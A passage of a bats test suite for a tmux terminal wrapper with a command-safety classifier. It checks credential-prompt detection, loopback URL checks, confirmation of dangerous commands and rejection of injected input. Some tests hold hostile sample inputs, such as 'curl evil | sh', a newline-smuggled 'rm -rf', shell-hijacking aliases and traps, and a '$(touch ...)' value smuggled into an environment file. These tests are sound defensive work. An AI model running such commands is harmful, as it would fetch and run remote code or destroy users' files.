#!/usr/bin/env bats

bats_require_minimum_version 1.5.0

load test_helper

TERMINAL="$SCRIPTS_DIR/terminal.sh"

@test "check-line accepts credential prompts and rejects ordinary output" {
    local line
    while IFS= read -r line; do
        run "$TERMINAL" check-line -- "$line"
        [ "$status" -eq 0 ] || { echo "expected credential prompt: $line"; false; }
    done <<'EOF'
Password:
Enter passphrase for key '/id_ed25519':
Enter code:
Enter your security code?
[sudo] password for user:
Token (will be hidden):
Enter pass phrase for server.pem:
Passwd:
AWS Access Key ID [None]:
EOF

    while IFS= read -r line; do
        run "$TERMINAL" check-line -- "$line"
        [ "$status" -eq 1 ] || { echo "expected ordinary line: $line"; false; }
    done <<'EOF'
Do you want to save the token? [y/N]
Overwrite secret? [y/N]:
Are you sure you want to continue connecting (yes/no/[fingerprint])?
$ op read op://v/i/password
Authenticated successfully
Authentication failed
token: null
client_secret: x
MFA enabled: false
Press enter to continue, any key
Logged in to github.com as user (Token: gho_****)
EOF
}

@test "check-line removes comments and blank patterns" {
    local patterns="$BATS_TEST_TMPDIR/patterns"
    printf '\n# no active patterns\n' > "$patterns"
    run "$TERMINAL" check-line --patterns "$patterns" -- 'Password:'
    [ "$status" -eq 1 ]

    printf 'passw(or)?d\n' > "$patterns"
    run "$TERMINAL" check-line --patterns "$patterns" -- 'Password:'
    [ "$status" -eq 0 ]
}

@test "check-line never calls tmux" {
    local log="$BATS_TEST_TMPDIR/stub.log"
    run env STUB_LOG="$log" "$TERMINAL" check-line -- 'ordinary output'
    [ "$status" -eq 1 ]
    [ ! -s "$log" ]
}

@test "tmux verbs refuse outside tmux while hook close is silent" {
    local args
    for args in 'open' 'run -- true' 'send -- x' 'read' 'wait --idle' 'close' 'list'; do
        run env -u TMUX -u TMUX_PANE bash -c "'$TERMINAL' $args"
        [ "$status" -eq 2 ] || { echo "$args returned $status"; false; }
        [[ "$output" == *'inside tmux'* ]] || false
    done

    run env -u TMUX -u TMUX_PANE bash -c "printf hook-input | '$TERMINAL' close --hook"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "malformed verb arguments exit 2" {
    local args
    # --bogus stands for any unknown flag: it is the *) usage arm of that verb's
    # own parser. Naming a plausible-but-absent flag here read as if the flag
    # existed and was handled.
    for args in 'open --size wrong' 'open --size' 'run --timeout x -- true' 'run --timeout' 'run --bogus' \
        'send --key' 'read --lines 0' 'read --lines' 'wait --timeout x --idle' 'wait' 'wait --idle --pattern x' \
        'close --bogus' 'bogus' 'laya' 'laya bogus' 'laya status extra'; do
        run env TMUX=fake TMUX_PANE=%0 bash -c "'$TERMINAL' $args"
        [ "$status" -eq 2 ] || { echo "$args returned $status"; false; }
    done
}

@test "the wrapper sets umask 077 only inside the process substitution" {
    grep -q '> >(umask 077; tee ' "$TERMINAL"
    run sed -n '/^write_rc_file()/,/^EOF/p' "$TERMINAL"
    [[ "$output" == *'__clux_run()'* ]] || false
    ! printf '%s\n' "$output" | grep -q '^umask' || false
}

# The reaper splits <pid>-<start>-<pane>: only the first two fields go to the
# server-key validator. A socket-mode state with no socket must never turn
# into a kill-pane on the user's server.
@test "the reaper reads the server key from the first two fields" {
    cat > "$BATS_TEST_TMPDIR/stubs/tmux" <<'STUB'
#!/usr/bin/env bash
echo "tmux $*" >> "${STUB_LOG:-/dev/null}"
case "$1" in
    display-message) echo 1234-1700000000 ;;
    list-panes) echo %0 ;;
esac
exit 0
STUB
    chmod +x "$BATS_TEST_TMPDIR/stubs/tmux"
    local root="$BATS_TEST_TMPDIR/root" log="$BATS_TEST_TMPDIR/stub.log"
    mkdir -p "$root/1234-1700000000-0" "$root/1234-1700000000-9"
    printf 'mode=socket\npane=%%0\nsocket=\nseq=0\n' > "$root/1234-1700000000-9/state"
    # A foreign server that is gone: its split pane id means nothing here.
    mkdir -p "$root/999999999-1-4"
    printf 'mode=split\npane=%%0\nsocket=\nseq=0\n' > "$root/999999999-1-4/state"
    run env STUB_LOG="$log" CLUX_TERMINAL_DIR="$root" TMUX=fake TMUX_PANE=%0 bash -c \
        "source '$TERMINAL'; terminal_init; reap_companions"
    [ "$status" -eq 0 ]
    [ -d "$root/1234-1700000000-0" ]
    [ ! -e "$root/1234-1700000000-9" ]
    [ ! -e "$root/999999999-1-4" ]
    ! grep -q 'kill-pane' "$log" || false
}

@test "the terminal skill carries Snippet S1 unchanged" {
    local skills="$REPO_ROOT/plugins/clux/skills"
    s1() { sed -n '/^# Tier 1: the harness/,/^echo "MANIFEST=/p' "$1"; }
    [ -n "$(s1 "$skills/configuring-tmux/SKILL.md")" ]
    [ "$(s1 "$skills/terminal/SKILL.md")" = "$(s1 "$skills/configuring-tmux/SKILL.md")" ]
}

@test "close --owner is parsed" {
    run env -u TMUX -u TMUX_PANE "$TERMINAL" close --owner
    [ "$status" -eq 2 ]
    run env TMUX=fake TMUX_PANE=%0 CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/none" "$TERMINAL" close --owner %5
    [ "$status" -eq 0 ]
}

@test "run --max-lines needs a positive integer" {
    run env TMUX=fake TMUX_PANE=%0 "$TERMINAL" run --max-lines 0 -- true
    [ "$status" -eq 2 ]
    run env TMUX=fake TMUX_PANE=%0 "$TERMINAL" wait --max-lines x --run 1
    [ "$status" -eq 2 ]
}

# A tmux stub for open: one server key, one pane, version 3.4.
open_tmux_stub() {
    cat > "$BATS_TEST_TMPDIR/stubs/tmux" <<'STUB'
#!/usr/bin/env bash
echo "tmux $*" >> "${STUB_LOG:-/dev/null}"
case "$1" in
    -V) echo 'tmux 3.4' ;;
    display-message) echo 1234-1700000000 ;;
    list-panes) echo %0 ;;
esac
exit 0
STUB
    chmod +x "$BATS_TEST_TMPDIR/stubs/tmux"
}

@test "open refuses a CLUX_LAYA_URL that is not a loopback host" {
    open_tmux_stub
    local log="$BATS_TEST_TMPDIR/stub.log" url
    for url in http://example.com:8000 'http://localhost:80@example.com' https://127.0.0.1:1; do
        run env STUB_LOG="$log" CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/root" TMUX=fake TMUX_PANE=%0 \
            CLUX_LAYA_URL="$url" "$TERMINAL" open
        [ "$status" -eq 6 ] || { echo "$url gave $status"; false; }
        [ "$output" = 'CLUX_LAYA_URL must name a loopback host: 127.0.0.1, localhost or ::1' ]
    done
    ! grep -q 'split-window' "$log" || false
}

@test "open with CLUX_LAYA_URL needs a client Python that imports laya" {
    open_tmux_stub
    local py
    # A Python with no laya package.
    printf '#!/bin/sh\nexec python3 -S -I -c "import sys; sys.exit(1)" "$@"\n' > "$BATS_TEST_TMPDIR/nolaya"
    chmod +x "$BATS_TEST_TMPDIR/nolaya"
    for py in "$BATS_TEST_TMPDIR/none/python3" "$BATS_TEST_TMPDIR/nolaya"; do
        run env CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/root" TMUX=fake TMUX_PANE=%0 \
            CLUX_LAYA_PYTHON="$py" CLUX_LAYA_URL=http://127.0.0.1:9 "$TERMINAL" open
        [ "$status" -eq 6 ] || { echo "$py gave $status"; false; }
        [ "$output" = 'laya not installed: run terminal.sh laya install' ]
    done
}

@test "open refuses when the CLUX_LAYA_URL server does not answer" {
    open_tmux_stub
    run env CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/root" TMUX=fake TMUX_PANE=%0 \
        CLUX_LAYA_URL=http://127.0.0.1:9 "$TERMINAL" open
    [ "$status" -eq 6 ]
    [ "$output" = 'laya not available at CLUX_LAYA_URL' ]
}

@test "open with no venv, or with no checkpoint, gives exit 6 and the install message" {
    open_tmux_stub
    local log="$BATS_TEST_TMPDIR/stub.log"
    run env -u CLUX_LAYA_URL STUB_LOG="$log" XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" \
        CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/root" TMUX=fake TMUX_PANE=%0 "$TERMINAL" open
    [ "$status" -eq 6 ]
    [ "$output" = 'laya not installed: run terminal.sh laya install' ]
    ! grep -q 'split-window' "$log" || false
    require_laya_python
    make_fake_venv "$BATS_TEST_TMPDIR/data/clux/laya"
    run env -u CLUX_LAYA_URL XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        CLUX_TERMINAL_DIR="$BATS_TEST_TMPDIR/root" TMUX=fake TMUX_PANE=%0 "$TERMINAL" open
    [ "$status" -eq 6 ]
    [ "$output" = 'laya not installed: run terminal.sh laya install' ]
}

@test "write_state and state_load carry the three laya fields" {
    run bash -c "source '$TERMINAL'
        D='$BATS_TEST_TMPDIR'
        write_state split %1 '' 3 4242 http://127.0.0.1:5 k1
        S_LAYA_PID=; S_LAYA_URL=; S_LAYA_KEY=
        state_load
        echo \"\$S_SEQ \$S_LAYA_PID \$S_LAYA_URL \$S_LAYA_KEY\"
        write_state split %1 '' 4
        state_load
        echo \"\$S_SEQ \$S_LAYA_PID \$S_LAYA_URL \$S_LAYA_KEY\"
        write_state split %1 '' 5 '' '' ''
        cat \"\$D/state\""
    [ "$status" -eq 0 ]
    [ "$output" = $'3 4242 http://127.0.0.1:5 k1\n4 4242 http://127.0.0.1:5 k1\nmode=split\npane=%1\nsocket=\nseq=5' ]
}

@test "pane_state: the regex layer adds credential, and a client failure gives 6" {
    require_laya_python
    start_fake_laya '{"answers": {"state": "other"}}'
    cat > "$BATS_TEST_TMPDIR/stubs/tmux" <<'STUB'
#!/usr/bin/env bash
case "$*" in
    *cursor_y*) echo 4 ;;
    capture-pane*) printf 'one\ntwo\nthree\nfour\n%s\n' "$CLUX_TEST_LINE" ;;
esac
exit 0
STUB
    chmod +x "$BATS_TEST_TMPDIR/stubs/tmux"
    probe() {
        CLUX_TEST_LINE="$1" bash -c "source '$TERMINAL'
            S_MODE=split; S_PANE=%1; S_LAYA_URL='$CLUX_LAYA_URL'; S_LAYA_KEY='$CLUX_LAYA_KEY'
            pane_state; echo \"\$? \$PANE_STATE\""
    }
    [ "$(probe 'Password:')" = '0 credential' ]
    [ "$(probe 'hello')" = '0 other' ]
    [ "$(fake_laya_states state | tail -n 1)" = '"one\ntwo\nthree\nfour\nhello"' ]
    set_fake_laya '{"answers": {"state": "yes_no"}}'
    [ "$(probe 'Continue? [y/N]')" = '0 yes_no' ]
    stop_fake_laya
    [[ "$(probe 'hello')" == '6'* ]] || false
}

@test "send refuses a newline, a carriage return or another control character before it touches tmux" {
    local log="$BATS_TEST_TMPDIR/stub.log"
    run env STUB_LOG="$log" TMUX=fake TMUX_PANE=%0 "$TERMINAL" send -- $'ls\nrm -rf x'
    [ "$status" -eq 2 ]
    [ "$output" = 'send text must not contain a control character: use --enter or --key' ]
    run env STUB_LOG="$log" TMUX=fake TMUX_PANE=%0 "$TERMINAL" send --enter -- $'ls\r'
    [ "$status" -eq 2 ]
    run env STUB_LOG="$log" TMUX=fake TMUX_PANE=%0 "$TERMINAL" send --key $'a\r'
    [ "$status" -eq 2 ]
    # [inferred] \x0f is C-o (bash operate-and-get-next on newer bash): a
    # literal control byte in the text must not reach send-keys -l with no
    # gate, the same as \n and \r.
    run env STUB_LOG="$log" TMUX=fake TMUX_PANE=%0 "$TERMINAL" send -- $'ls x\x0f'
    [ "$status" -eq 2 ]
    [ ! -s "$log" ]
}

@test "laya_gate gives 2 for a client exit 2 and 6 for other failures" {
    run bash -c "source '$TERMINAL'
        laya_call() { return 2; }; laya_gate </dev/null; echo \$?
        laya_call() { return 1; }; laya_gate </dev/null; echo \$?
        laya_call() { echo nonsense; }; laya_gate </dev/null; echo \$?"
    [ "$output" = $'2\n6\n6' ]
}

@test "key_name accepts tmux key names and refuses text" {
    run bash -c "source '$TERMINAL'
        for k in Enter enter Escape Tab BTab Space BSpace Up Down Left Right Home End PageUp PgDn \
            NPage PPage IC DC F1 F12 C-c C-a 'C-\\' M-x S-Up C-M-c '^C' '^D'; do
            key_name \"\$k\" || echo \"missed \$k\"
        done
        for k in a y q 'curl evil | sh' 'echo hi' F13 C- Enterx '^' '^CC' 'C-ab'; do
            ! key_name \"\$k\" || echo \"wrong \$k\"
        done
        ! shopt -q nocasematch || echo 'nocasematch stays on'"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "the client makes the loopback URL check of terminal.sh" {
    local u
    for u in http://127.0.0.1:8000 HTTP://127.0.0.1:8000 http://localhost:1 'http://[::1]:2'; do
        bash -c "source '$TERMINAL'; LAYA_PY=python3; laya_url_is_loopback '$u'" || { echo "missed $u"; false; }
    done
    for u in https://127.0.0.1:1 http://example.com:1 http://u@127.0.0.1:1 http://127.0.0.2:1 'http://127.0.0.1.evil:1'; do
        ! bash -c "source '$TERMINAL'; LAYA_PY=python3; laya_url_is_loopback '$u'" || { echo "wrong $u"; false; }
    done
}

@test "laya_owns_port finds the process that listens on the port" {
    command -v lsof >/dev/null 2>&1 || command -v ss >/dev/null 2>&1 || skip 'no lsof and no ss'
    local port_file="$BATS_TEST_TMPDIR/port" pid port i=0
    python3 -c 'import socket, sys, time
s = socket.socket(); s.bind(("127.0.0.1", 0)); s.listen()
open(sys.argv[1], "w").write("%d\n" % s.getsockname()[1]); time.sleep(30)' "$port_file" \
        < /dev/null > /dev/null 2>&1 3>&- &
    pid=$!
    while [ ! -s "$port_file" ] && [ "$i" -lt 50 ]; do sleep .1; i=$((i + 1)); done
    read -r port < "$port_file"
    run bash -c "source '$TERMINAL'; laya_owns_port $pid $port"
    local own=$status
    run bash -c "source '$TERMINAL'; laya_owns_port $$ $port"
    local other=$status
    kill "$pid"
    [ "$own" -eq 0 ]
    [ "$other" -ne 0 ]
}

@test "laya_stop_server stops several servers that ignore TERM with one wait" {
    local bin="$BATS_TEST_TMPDIR/bin" a b start
    mkdir -p "$bin"
    printf '#!/usr/bin/env bash\ntrap "" TERM\nwhile :; do sleep .2; done\n' > "$bin/laya-serve"
    chmod +x "$bin/laya-serve"
    # One level deeper, so a killed server is not a zombie of this shell.
    a=$( ("$bin/laya-serve" < /dev/null > /dev/null 2>&1 3>&- & echo $!) )
    b=$( ("$bin/laya-serve" < /dev/null > /dev/null 2>&1 3>&- & echo $!) )
    sleep .3
    start=$SECONDS
    # The real ps: the stub ps of this file finds no process.
    PATH="/bin:/usr/bin:$PATH" bash -c "source '$TERMINAL'; laya_stop_server $a $b"
    local took=$((SECONDS - start)) alive=0
    kill -0 "$a" 2>/dev/null && alive=1
    kill -0 "$b" 2>/dev/null && alive=1
    kill -9 "$a" "$b" 2>/dev/null || true
    [ "$alive" -eq 0 ]
    [ "$took" -lt 5 ]
}

@test "interrupt_key finds only the keys that skip the Laya pane check" {
    run bash -c "source '$TERMINAL'
        for k in C-c c-C C-d C-z 'C-\\' '^C' '^d' Escape escape; do
            interrupt_key \"\$k\" || echo \"missed \$k\"
        done
        for k in Enter C-m C-a C-u Up Tab M-c C-M-c c; do
            ! interrupt_key \"\$k\" || echo \"wrong \$k\"
        done"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "the run time budget stays 10 s under the 120 s limit of the Bash tool" {
    local t g
    read -r t g < <(bash -c "source '$TERMINAL'; echo \"\$RUN_TIMEOUT_DEFAULT \$LAYA_GUARD_LIMIT\"")
    [ -n "$t" ] && [ -n "$g" ]
    # Tenths of a second: the gate with its retry, wait_for_prompt, the clear,
    # the run limit, the last pane_state call, the report grace, the late
    # SECONDS tick and the guard limit.
    [ $((110 + 20 + 50 + t * 10 + 110 + 10 + 10 + g * 10)) -le 1100 ]
    grep -q '^REQUEST_LIMIT = 5.0$' "$LAYA_CLIENT"
    grep -q '^RETRY_DELAY = 1.0 ' "$LAYA_CLIENT"
    grep -q 'local timeout=\$RUN_TIMEOUT_DEFAULT ' "$TERMINAL"
}

@test "laya status with no venv" {
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [ "$output" = "venv=$BATS_TEST_TMPDIR/data/clux/laya"$'\nversion=none\ncheckpoint=missing\nserver=none' ]
}

@test "laya status with the venv and the checkpoint" {
    require_laya_python
    make_fake_venv "$BATS_TEST_TMPDIR/data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nversion='[0-9]*$'\ncheckpoint=present\nserver=none' ]] || false
}

@test "laya install stops when the venv and the checkpoint are present" {
    require_laya_python
    make_fake_venv "$BATS_TEST_TMPDIR/data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" laya install
    [ "$status" -eq 0 ]
    [[ "$output" == 'laya '*' is already installed'* ]] || false
    # An installed venv needs no python3 3.10 on PATH.
    run env -u TMUX -u TMUX_PANE PATH="$BATS_TEST_TMPDIR/nopython:/bin:/usr/sbin:/sbin" \
        XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        /bin/bash -c "PATH=\$PATH; exec '$(command -v bash)' '$TERMINAL' laya install"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [[ "$output" == 'laya '*' is already installed'* ]] || false
}

@test "laya install needs Python 3.10 or later" {
    local name
    for name in python3.12 python3.13 python3.11 python3.10 python3; do
        printf '#!/usr/bin/env bash\nexit 1\n' > "$BATS_TEST_TMPDIR/stubs/$name"
        chmod +x "$BATS_TEST_TMPDIR/stubs/$name"
    done
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" "$TERMINAL" laya install
    [ "$status" -eq 2 ]
    [ "$output" = 'laya install needs python3 3.10 or later' ]
    [ ! -e "$BATS_TEST_TMPDIR/data/clux/laya" ]
}

@test "a failed pip install deletes the venv and shows the pip error" {
    cat > "$BATS_TEST_TMPDIR/stubs/python3.12" <<'STUB'
#!/usr/bin/env bash
# The version check passes. "-m venv DIR" makes a venv whose python3 fails
# as pip does.
case "$1" in
    -m)
        mkdir -p "$3/bin"
        printf '#!/usr/bin/env bash\necho "stub pip: no matching distribution" >&2\nexit 1\n' > "$3/bin/python3"
        chmod +x "$3/bin/python3"
        ;;
esac
exit 0
STUB
    chmod +x "$BATS_TEST_TMPDIR/stubs/python3.12"
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" "$TERMINAL" laya install
    [ "$status" -eq 1 ]
    [[ "$output" == *'stub pip: no matching distribution'* ]] || false
    [[ "$output" == *'laya install: pip install failed'* ]] || false
    [ ! -e "$BATS_TEST_TMPDIR/data/clux/laya" ]
}

@test "laya install with the venv and no checkpoint needs no base python3" {
    require_laya_python
    local venv="$BATS_TEST_TMPDIR/data/clux/laya" name
    make_fake_venv "$venv"
    rm "$venv/bin/laya-serve"
    printf '#!/usr/bin/env bash\necho boom\nexit 1\n' > "$venv/bin/laya-serve"
    chmod +x "$venv/bin/laya-serve"
    for name in python3.12 python3.13 python3.11 python3.10 python3; do
        printf '#!/usr/bin/env bash\nexit 1\n' > "$BATS_TEST_TMPDIR/stubs/$name"
        chmod +x "$BATS_TEST_TMPDIR/stubs/$name"
    done
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" laya install
    [ "$status" -eq 1 ] || { echo "$output"; false; }
    [[ "$output" == *'laya install: the checkpoint download failed: laya-serve ended before it answered'* ]] || false
    [ -f "$venv/.clux-installed" ]
}

@test "a failed checkpoint download keeps the venv and removes secret lines from the log" {
    require_laya_python
    local venv="$BATS_TEST_TMPDIR/data/clux/laya" tmp="$BATS_TEST_TMPDIR/tmp"
    mkdir -p "$tmp"
    make_fake_venv "$venv"
    rm "$venv/bin/laya-serve"
    printf '#!/usr/bin/env bash\necho "token AKIAABCDEFGHIJKLMNOP"\necho boom\nexit 1\n' > "$venv/bin/laya-serve"
    chmod +x "$venv/bin/laya-serve"
    run env -u TMUX -u TMUX_PANE TMPDIR="$tmp" XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" laya install
    [ "$status" -eq 1 ]
    [[ "$output" == *'laya install: the checkpoint download failed: laya-serve ended before it answered'* ]] || false
    [[ "$output" == *'boom'* ]] || false
    [[ "$output" != *'AKIA'* ]] || false
    [ -f "$venv/.clux-installed" ]
    [ -z "$(ls -A "$tmp")" ]
}

@test "run refuses a newline, a tab or another control character before it touches tmux" {
    local log="$BATS_TEST_TMPDIR/stub.log" cmd
    for cmd in $'ls\nrm -rf x' $'ls\trm' $'echo \x1b[2J'; do
        run env STUB_LOG="$log" TMUX=fake TMUX_PANE=%0 "$TERMINAL" run -- "$cmd"
        [ "$status" -eq 2 ]
        [ "$output" = 'run command must not contain a control character: give one line' ]
    done
    [ ! -s "$log" ]
}

# rc_run ARGS... — make rc.bash in a test directory and call __clux_run in a
# bash that sourced it. RC_CMD is the text of 1.cmd, RC_INPUT the answer.
rc_run() {
    local d="$BATS_TEST_TMPDIR/rc"
    mkdir -p "$d"
    rm -f "$d"/1.*
    printf '%s' "$RC_CMD" > "$d/1.cmd"
    printf '%s\n' "${RC_REASON:-destructive 0.95}" > "$d/1.reason"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    printf '%s\n' "${RC_INPUT:-}" | bash -c "source '$d/rc.bash'; ${RC_SETUP:-:}; __clux_run 1 $*; echo \"rc=\$(cat '$d/1.rc' 2>/dev/null)\""
}

rc_sum() { bash -c "source '$TERMINAL'; command_sum \"\$1\"" _ "$1"; }

@test "__clux_run refuses a command that is not the command that Laya examined" {
    local mark="$BATS_TEST_TMPDIR/ran" sum
    sum=$(rc_sum 'echo safe')
    [ "${#sum}" -eq 32 ]
    RC_CMD="touch '$mark'" run rc_run "$sum" plain
    [[ "$output" == *'refused: the command changed after Laya examined it'* ]] || false
    [[ "$output" == *'rc=126' ]] || false
    [ ! -e "$mark" ]
    RC_CMD="touch '$mark'" run rc_run
    [[ "$output" == *'refused: this run is not waiting to start'* ]] || false
    [ ! -e "$mark" ]
    sum=$(rc_sum "touch '$mark'")
    RC_CMD="touch '$mark'" run rc_run "$sum" plain
    [[ "$output" == *'rc=0' ]] || false
    [ -e "$mark" ]
}

@test "__clux_run asks the user when the typed line says confirm, with or without a .confirm file" {
    local mark="$BATS_TEST_TMPDIR/ran" sum
    sum=$(rc_sum "touch '$mark'")
    RC_CMD="touch '$mark'" RC_INPUT=n run rc_run "$sum" confirm
    [[ "$output" == *'laya: dangerous (destructive 0.95)'* ]] || false
    [[ "$output" == *'rc=126' ]] || false
    [ ! -e "$mark" ]
    RC_CMD="touch '$mark'" RC_INPUT=y run rc_run "$sum" confirm
    [[ "$output" == *'rc=0' ]] || false
    [ -e "$mark" ]
}

@test "the question shows control characters of the reason and the command as ?" {
    local sum
    sum=$(rc_sum $'echo a\rb')
    RC_CMD=$'echo a\rb' RC_REASON=$'x\x1b[2Jy' RC_INPUT=n run rc_run "$sum" confirm
    [[ "$output" == *'laya: dangerous (x?[2Jy)'* ]] || false
    [[ "$output" == *'$ echo a?b'* ]] || false
}

@test "__clux_run has no safe mode: a mode that is not plain or confirm runs nothing" {
    local mark="$BATS_TEST_TMPDIR/ran" sum
    sum=$(rc_sum "touch '$mark'")
    RC_CMD="touch '$mark'" run rc_run "$sum" safe file /bin/touch
    [[ "$output" == *'refused: the mode is not plain or confirm'* ]] || false
    [[ "$output" == *'rc=126' ]] || false
    [ ! -e "$mark" ]
    ! grep -q 'safe list' "$BATS_TEST_TMPDIR/rc/rc.bash" || false
}

@test "__clux_run removes the .confirm of a run that has an .rc" {
    local d="$BATS_TEST_TMPDIR/rc" sum
    sum=$(rc_sum 'true')
    RC_CMD='true' RC_SETUP=": > '$d/1.confirm'; printf '126\\n' > '$d/1.rc'" run rc_run "$sum" confirm
    [[ "$output" == *'refused: this run is not waiting to start'* ]] || false
    [ ! -e "$d/1.confirm" ]
    # A plain run that starts removes .confirm too.
    RC_CMD='true' RC_SETUP=": > '$d/1.confirm'" run rc_run "$sum" plain
    [[ "$output" == *'rc=0' ]] || false
    [ ! -e "$d/1.confirm" ]
}

@test "run_not_started ends a run whose typed line the pane shell never read" {
    local d="$BATS_TEST_TMPDIR/ns"
    mkdir -p "$d"
    : > "$d/2.cmd"; : > "$d/2.confirm"
    run bash -c "source '$TERMINAL'; D='$d'; S_SEQ=2; run_not_started"
    [ "$status" -eq 0 ]
    [ ! -e "$d/2.cmd" ] && [ ! -e "$d/2.confirm" ]
    [ -e "$d/2.notstarted" ] && [ -e "$d/2.declined" ] && [ -e "$d/2.done" ]
    [ "$(cat "$d/2.rc")" = 126 ]
    # A run that the pane shell started (no .cmd) or that ended stays.
    rm -f "$d"/2.*
    : > "$d/3.confirm"
    run bash -c "source '$TERMINAL'; D='$d'; S_SEQ=3; run_not_started"
    [ -e "$d/3.confirm" ] && [ ! -e "$d/3.rc" ]
}

@test "release_run frees the lock only when busy/owner names that run or no run" {
    local d="$BATS_TEST_TMPDIR/own" o
    for o in pending 4 3 ''; do
        rm -rf "$d"; mkdir -p "$d/busy"
        printf '%s\n' "$o" > "$d/busy/owner"
        bash -c "source '$TERMINAL'; D='$d'; S_SEQ=3; release_run 3"
        case "$o" in
            3|'') [ ! -d "$d/busy" ] || { echo "owner '$o' kept the lock"; false; } ;;
            *) [ -d "$d/busy" ] || { echo "owner '$o' lost the lock"; false; } ;;
        esac
    done
}

@test "a live reader keeps the lock and the output of its run" {
    local d="$BATS_TEST_TMPDIR/rd"
    mkdir -p "$d/busy"
    printf '3\n' > "$d/busy/owner"
    printf '0\n' > "$d/3.rc"; : > "$d/3.out"
    sleep 30 3>&- & local live=$!
    ln -s "$live" "$d/3.reading"
    bash -c "source '$TERMINAL'; D='$d'; S_SEQ=3; release_if_done; remove_stale_output"
    [ -d "$d/busy" ]
    [ -e "$d/3.out" ]
    kill "$live"; wait "$live" 2>/dev/null || true
    bash -c "source '$TERMINAL'; D='$d'; S_SEQ=3; release_if_done; remove_stale_output"
    [ ! -d "$d/busy" ]
    [ ! -e "$d/3.out" ]
}

@test "laya_guard sends --cut only for cut text" {
    local d="$BATS_TEST_TMPDIR/cut"
    mkdir -p "$d"
    printf 'a\n' > "$d/in"
    run bash -c "source '$TERMINAL'; D='$d'
        laya_call() { echo \"args: \$*\" >&2; printf 'held=0\\na'; }
        laya_guard '$d/in'; laya_guard '$d/in' 1; LAYA_GUARD_BYTES=1; laya_guard '$d/in'"
    [ "${lines[0]}" = 'args: output --render --limit 15' ]
    [ "${lines[1]}" = 'args: output --render --cut --limit 15' ]
    [ "${lines[2]}" = 'args: output --render --cut --limit 15' ]
    # report_run over --max-lines, read and wait --pattern pass 1.
    [ "$(grep -cE 'laya_guard <\(.*\) 1( \|\||;)' "$TERMINAL")" -eq 3 ]
}

@test "a run command cannot change the functions, traps or options of the pane shell" {
    local d="$BATS_TEST_TMPDIR/sub" c
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    c="cd /tmp; export FOO=bar; BAR=1; eval 'cd() { echo HIJACKED; }'; f() { :; }; trap 'echo T' DEBUG"
    c="$c; export PROMPT_COMMAND=evil BASH_ENV=/x; alias ls=rm; shopt -s expand_aliases; enable -n echo"
    printf '%s' "$c" > "$d/1.cmd"
    run bash -c "source '$d/rc.bash'; __clux_run 1 \$(__clux_sum \"\$(cat '$d/1.cmd')\") plain >/dev/null 2>&1
        echo \"\$PWD|\${FOO-}|\${BAR-}|\${PROMPT_COMMAND-}|\${BASH_ENV-none}\"
        declare -F | grep -c ' cd\$\| f\$'; trap -p DEBUG | wc -l | tr -d ' '
        shopt -q expand_aliases && echo aliases-on || echo aliases-off
        enable -n | wc -l | tr -d ' '; cd /; echo \$PWD"
    [ "$output" = $'/tmp|bar|||none\n0\n0\naliases-off\n0\n/' ] || { echo "$output"; false; }
    [ ! -e "$d/1.keep" ]
}

@test "__clux_load takes only an end-marked file and only permitted names" {
    local d="$BATS_TEST_TMPDIR/load"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    printf '/tmp\0KEEP=1\0BASH_ENV=/x\0__clux_dir=/y\0bad name=1\0' > "$d/k"
    run bash -c "source '$d/rc.bash'; export OLD=1; __clux_load '$d/k'; echo \"\$PWD|\${KEEP-}|\${OLD-}\""
    [ "$output" = "$(pwd)||1" ]
    printf '/tmp\0KEEP=$(touch %s)\0BASH_ENV=/x\0=\0' "$d/ran" > "$d/k"
    run bash -c "source '$d/rc.bash'; export OLD=1; __clux_load '$d/k'; echo \"\$PWD|\${KEEP-}|\${OLD-}|\${BASH_ENV-none}\""
    [ "$output" = "/tmp|\$(touch $d/ran)||none" ]
    [ ! -e "$d/ran" ]
}

@test "cursor_mid_line gives 2 when it cannot read the cursor" {
    run bash -c "source '$TERMINAL'
        tmux_state() { return 1; }; cursor_mid_line; echo \$?
        tmux_state() { case \"\$1\" in display-message) echo '3 0' ;; capture-pane) printf 'ab\\xc3\\n' ;; esac; }
        LAYA_PY=/bin/false; cursor_mid_line; echo \$?"
    [ "$output" = $'2\n2' ]
}

@test "pane_state sends no request when only rows above the last 5 change" {
    local count="$BATS_TEST_TMPDIR/count"
    run bash -c "source '$TERMINAL'
        n=0
